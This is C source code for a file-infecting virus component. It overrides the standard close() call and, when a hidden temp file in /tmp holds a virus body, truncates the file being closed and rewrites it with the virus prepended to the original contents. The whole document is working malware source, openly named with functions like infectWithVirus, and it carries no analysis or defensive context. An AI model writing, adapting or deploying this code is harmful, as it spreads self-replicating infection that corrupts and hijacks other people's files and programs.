#include <stdlib.h>
#include <string.h>
#include <strings.h>
#include <fcntl.h>
#include <errno.h>
#include <limits.h>
#include <asm/unistd.h>
#include <sys/syscall.h>
#include <stdio.h>
#include <sys/types.h>

int infectWithVirus(int fd, int fdTemp, char *argv);

int close(int fildes) {
    int tempFd;
    char buf[100];

    // This will check to see if the virus temp file exists
    sprintf(buf, "/tmp/.%u.%u", getpid(), getuid());
    if ((tempFd = syscall(__NR_open, buf, O_RDONLY)) != -1) {
        // reinfect if it does
        infectWithVirus(fildes, tempFd, buf);
        unlink(buf);
    }

    return syscall(__NR_close, fildes);
}

int infectWithVirus(int fd, int fdTemp, char *argv) {
    int i = 0, virLen = 0;
    // fstat file
    lseek(fd, SEEK_SET, 0);
    struct stat fstatInfo;
    if (fstat(fdTemp, &fstatInfo) == -1) {
        syscall(__NR_close, fdTemp);
        return -1;
    }

    // Grab the virus
    char offBuf = 0x00;
    char *virBuf = malloc(sizeof(char) * fstatInfo.st_size);
    while (syscall(__NR_read, fdTemp, &offBuf, 1) == 1) {
        memcpy(&virBuf[virLen++], &offBuf, 1);
    }
    syscall(__NR_close, fdTemp);

    if (fstat(fd, &fstatInfo) == -1) {
        return -1;
    }

    // copy the file
    offBuf = 0x00;
    char *fileBuf = malloc(sizeof(char) * fstatInfo.st_size);
    while (read(fd, &offBuf, 1) == 1) {
        memcpy(&fileBuf[i++], &offBuf, 1);
    }

    // grab the file path
    char pathBuf[100];
    char dest[PATH_MAX];
    sprintf(pathBuf, "/proc/self/fd/%d", fd);
    if (readlink(pathBuf, dest, PATH_MAX) == -1) {
        exit(errno);
    }

    // Truncate the file
    syscall(__NR_close, fd);
    if ((fd = syscall(__NR_open, dest, O_RDWR | O_TRUNC)) == -1) {
        exit(1);
    }

    // Overwrite with virus and file
    for (i = 0; i < virLen; i++) {
        write(fd, &virBuf[i], 1);
    }
    for (i = 0; i < fstatInfo.st_size; i++) {
        write(fd, &fileBuf[i], 1);
    }

    free(virBuf);
    free(fileBuf);
    return 0;
}